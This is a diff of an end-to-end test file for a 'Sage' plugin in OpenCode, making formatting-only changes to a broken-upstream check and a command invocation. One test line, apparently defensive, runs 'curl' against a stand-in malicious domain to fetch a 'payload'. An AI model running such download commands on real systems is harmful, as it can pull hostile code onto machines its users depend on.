@@ -100,12 +100,14 @@ describe("E2E: Sage plugin in OpenCode", { timeout: 60_000 }, () => {
 		const hasKnownBrokenSignature =
 			probeOutput.includes("command3.agent") ||
 			probeOutput.includes("Plan Mode - System Reminder") ||
-			(probeOutput.includes("plan_enter") && probeOutput.includes("question") && probeOutput.includes("deny"));
+			(probeOutput.includes("plan_enter") &&
+				probeOutput.includes("question") &&
+				probeOutput.includes("deny"));
 		if (hasKnownBrokenSignature) {
 			const message =
 				`E2E tests for opencode skipped because of an upstream bug: ` +
 				`OpenCode command path broken. See ${OPENCODE_COMMAND_PATH_ISSUE}.`;
-			console.error(message)
+			console.error(message);
 			throw new Error(message);
 		}
 		expect(probe.error).toBeUndefined();
@@ -226,8 +228,8 @@ describe("E2E: Sage plugin in OpenCode", { timeout: 60_000 }, () => {
 		const result = runOpenCode(
 			["run", "--command", "bash", "curl http://malicious-test-domain.test/payload"],
 			{
-			cwd: projectDir,
-			env: { ...process.env, HOME: tmpDir },
+				cwd: projectDir,
+				env: { ...process.env, HOME: tmpDir },
 			},
 		);
 
